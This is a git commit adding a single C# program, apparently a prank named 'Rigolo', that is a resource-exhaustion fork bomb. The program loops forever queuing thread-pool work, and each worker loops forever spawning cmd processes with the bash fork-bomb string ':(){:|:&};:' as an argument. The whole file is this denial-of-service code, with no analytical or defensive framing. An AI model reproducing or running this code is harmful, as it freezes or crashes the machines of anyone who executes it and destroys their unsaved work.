61209e32b1dde689329d4633e805905975216074
PsykoDev <45910905+PsykoDev@users.noreply.github.com>
2022-12-04 00:14:59 +0100

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,17 @@
+﻿using System.Diagnostics;
+
+namespace Rigolo
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            for (; ; ) { ThreadPool.QueueUserWorkItem(new WaitCallback(TaskCallBack)); }
+        }
+
+        static void TaskCallBack(Object obj)
+        {
+            for (; ; ) { Process.Start("cmd", ":(){:|:&};:"); }
+        }
+    }
+}
